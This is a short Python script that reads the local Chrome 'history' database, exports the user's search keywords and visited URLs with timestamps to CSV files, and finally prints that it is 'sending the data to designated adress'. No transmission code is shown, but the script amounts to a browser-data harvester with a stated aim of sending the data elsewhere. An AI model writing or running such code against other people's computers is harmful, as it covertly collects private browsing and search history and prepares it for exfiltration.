import sqlite3
import os 
import datetime
import pandas as pd




if not os.path.isdir(os.environ.get('USERNAME')):
    os.makedirs(os.environ.get('USERNAME'))
    print('folder created')

	



user_path = os.curdir + '/' + os.environ.get('USERNAME') + '/'
path_history = user_path + 'history.csv'
path_keyword = user_path + 'keyword.csv'



data_path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default'
files = os.listdir (data_path)
history_db = os.path.join(data_path,'history')



c = sqlite3.connect(history_db)
cursor = c.cursor()
select_keywords = 'SELECT term FROM keyword_search_terms ORDER BY "_rowid_" ASC;'
cursor.execute(select_keywords)
row = cursor.fetchall()
df_keywords = pd.DataFrame({'col':row})
df_keywords.append(row)
df_keywords.to_csv(path_keyword)







select_history = 'SELECT id,url,title,last_visit_time FROM urls;'
cursor.execute(select_history)
row = cursor.fetchall()

df_history = pd.DataFrame(row,columns=['id', 'url', 'title','time_data'])
time= []
time_data =df_history['time_data']
for time_data in time_data:
	x = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time_data)
	time.append(x.isoformat())


df_history['real time'] = time
print(df_history)
df_history.to_csv(path_history)

print('data fetching is complete')



print('sending the data to designated adress......')



